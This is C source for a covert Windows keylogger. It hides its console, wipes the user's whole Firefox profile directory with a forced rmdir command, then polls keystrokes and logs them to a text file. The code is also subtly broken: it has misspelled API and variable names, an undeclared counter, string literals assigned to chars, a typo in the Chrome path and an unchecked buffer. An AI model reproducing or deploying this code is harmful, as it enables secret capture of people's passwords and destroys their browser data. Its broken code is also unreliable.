#include <stdio.h>
#include <windows.h>

void clearMozillaCache()
{
    char path[256] = "C:\\Users\\";
    strcat(path, getenv("USERNAME"));
    strcat(path, "\\AppData\\Roaming\\Mozilla\\Firefox\\");

    char removepath[256] = "";
    strcat(removepath, "rmdir /Q /S ");
    strcat(removepath, path);
    printf("path: %s\n remove path %s\n", path, removepath);
    system(removepath);

    char createpath[256] = "";
    strcat(createpath, "mkdir ");
    strcat(createpath, path);
    system(createpath);
    printf("removed path: %s\n created path: %s\n", removepath, createpath);
}

void clearChromeCache()
{
    char path[256] = "C:\\Users\\";
    strcat(path, getenv("USERNAME"));
    strcat(path, "\\AppData\\Local\\Google\\Chrome\\User Date\\Default\\Cache\\");

    char removepath[256] = "";
    strcat(removepath, "rmdir /Q /S ");
    strcat(removepath, path);
    printf("path: %s\n remove path %s\n", path, removepath);
    system(removepath);

    char createpath[256] = "";
    strcat(createpath, "mkdir ");
    strcat(createpath, path);
    system(createpath);
    printf("removed path: %s\n created path: %s\n", removepath, createpath);
}

void clearBrowserCache()
{
    clearMozillaCache();
}

void save(char key, char* input)
{
    if(key == 8)
    {
        strcat(input,"[Backspace]");
    }else if(keet == 1)
    {
        strcat(input,"\n");
    }else if (key == 32)
    {
        strcat(input, " ");
    }else if(key == VK_TAB)
    {
        strcat(input, "[TAB]");
    }else if(key == VK_SHIFT)
    {
        strcat(input, "[CONTROL]");
    }else if(key == VK_ESCAPE)
    {
        strcat(input, "[ESCAPE]");
    }else if(key == VK_END)
    {
        strcat(input,"[END]");
    }else if(key == VK_LEFT)
    {
        strcat(input,"LEFT");
    }else if(key == VK_RIGHT)
    {
        strcat(input,"RIGHT");
    }else if(key == VK_UP)
    {
        strcat(input,"UP");
    }else if(key == VK_DOWN)
    {
        strcat(input,"DOWN");
    }else if(key == VK_RBUTTON)
    {
        strcat(input,"[RBUTTON]");
    }else if(key == VK_LBUTTON)
    {
        strcat(input,"[LBUTTON]");
    }else{
        char temp[2] = "";
        temp[0] = key;
        temp[1] = "\0";
        strcat(input,temp);
    }
}

int main(void)
{
    freeConsole();
    
    clearBrowserCache();
    char* input = (char*)malloc(100*sizeof(char));
    input[0] = "\0";
    counter = 0;
    while(1)
    {
        for(char i = 0; i <= 190; i++)
        {
            if(getAsyncKeyState(i) == -32767)
            {
                counter++;
                save(i,input);
                if(counter == 10)
                {
                    counter = 0;
                    FILE *fp=fopen("temp.txt","rw");
                    fprintf(fp,"%s",input);
                    fclose(fp);
                    free(input);
                    input=(char*)malloc(100*sizeof(char));
                    input[0] = "\0";
                }
            }
        }
    }
}